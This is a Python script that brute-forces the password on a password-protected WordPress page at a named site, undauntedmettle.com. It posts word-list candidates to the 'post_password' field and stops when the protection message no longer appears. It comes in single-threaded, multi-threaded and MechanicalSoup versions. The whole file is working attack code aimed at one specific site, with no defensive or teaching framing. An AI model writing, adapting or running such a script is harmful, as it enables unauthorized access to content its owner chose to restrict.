import urllib.request
import urllib.parse
from bs4 import BeautifulSoup
import threading
import mechanicalsoup

# Test

url = 'https://undauntedmettle.com/chapters/chapter-1/'
print('Trying:', 'iambic')
data = {
    'post_password': 'iambic',
    'Submit': 'Enter'
}
headers = {
    'Host': 'undauntedmettle.com',
    'Origin': 'https://undauntedmettle.com',
    'Referer': 'https://undauntedmettle.com/chapters/chapter-1/'
}
params = urllib.parse.urlencode(data).encode('utf-8')
req = urllib.request.Request(url, data=params, headers=headers)
handler = urllib.request.urlopen(req)
soup = BeautifulSoup(str(handler.read()), 'html.parser')

# Single thread
# url = 'https://undauntedmettle.com/wp-login.php?action=postpass'
url = 'https://undauntedmettle.com/chapters/chapter-1/'
with open('word_list_space.txt', 'r') as f:
    for pw in f:
        print('Trying:', pw.replace('\r', '').replace('\n', ''))
        data = {
            'post_password': pw.replace('\r', '').replace('\n', ''),
            'Submit': 'Enter'
        }
        headers = {
            'Host': 'undauntedmettle.com',
            'Origin': 'https://undauntedmettle.com',
            'Referer': 'https://undauntedmettle.com/chapters/chapter-1/'
        }
        params = urllib.parse.urlencode(data).encode('utf-8')
        req = urllib.request.Request(url, data=params, headers=headers)
        with urllib.request.urlopen(req) as handler:
            soup = BeautifulSoup(str(handler.read()), 'html.parser')
            protected = False
            for p in [str(x) for x in soup.find_all('p')]:
                if 'This content is password protected.' in p:
                    protected = True
                    break
            if not protected:
                print('Matched password:', pw)
                break

# Multi thread


class myThread(threading.Thread):
    def __init__(self, threadID, name, word_list):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.word_list = word_list

    def run(self):
        # url = 'https://undauntedmettle.com/wp-login.php?action=postpass'
        url = 'https://undauntedmettle.com/chapters/chapter-1/'
        with open(self.word_list, 'r') as f:
            for pw in f:
                print('Trying:', pw.replace('\r', '').replace('\n', ''))
                data = {
                    'post_password': pw.replace('\r', '').replace('\n', ''),
                    'Submit': 'Enter'
                }
                headers = {
                    'Host': 'undauntedmettle.com',
                    'Origin': 'https://undauntedmettle.com',
                    'Referer': 'https://undauntedmettle.com/chapters/chapter-1/'
                }
                params = urllib.parse.urlencode(data).encode('utf-8')
                req = urllib.request.Request(url, data=params, headers=headers)
                with urllib.request.urlopen(req) as handler:
                    soup = BeautifulSoup(str(handler.read()), 'html.parser')
                    protected = False
                    for p in [str(x) for x in soup.find_all('p')]:
                        if 'This content is password protected.' in p:
                            protected = True
                            break
                    if not protected:
                        print('Matched password:', pw)
                        break


# for ascii in range(65, 91):  # A - Z
for ascii in range(65, 76):  # only A - L
    file = 'word_list\\word_list_' + chr(ascii) + '.txt'
    new_thread = myThread(ascii - 64, ('Thread-' + str(ascii - 64)), file)
    new_thread.start()
    # new_thread.join()


# Using Mechanize


class passAttempt(threading.Thread):
    def __init__(self, word_list):
        threading.Thread.__init__(self)
        self.word_list = word_list

    def run(self):
        url = 'https://undauntedmettle.com/chapters/chapter-1/'
        with open(self.word_list, 'r') as f:
            for pw in f:
                pw = pw.replace('\r', '').replace('\n', '')
                print('Trying:', pw)
                with mechanicalsoup.StatefulBrowser() as br:
                    br.open(url)
                    br.select_form()
                    br['post_password'] = pw
                    br.submit_selected()
                    protected = False
                    for p in [str(x) for x in br.get_current_page().select('p')]:
                        if 'This content is password protected.' in p:
                            protected = True
                            break
                    if not protected:
                        print('Matched password:', pw)
                        print(br.get_current_page())
                        break


# for ascii in range(65, 91):  # A - Z
for ascii in range(65, 76):  # only A - L
    file = 'word_list\\word_list_' + chr(ascii) + '.txt'
    attempt_thread = passAttempt(file)
    attempt_thread.start()

# MechanicalSoup Test Attempt

url = 'https://undauntedmettle.com/chapters/chapter-1/'
br = mechanicalsoup.StatefulBrowser()
br.open(url)
br.select_form()
br['post_password'] = '[actual password]'
br.submit_selected()
br.get_current_page()
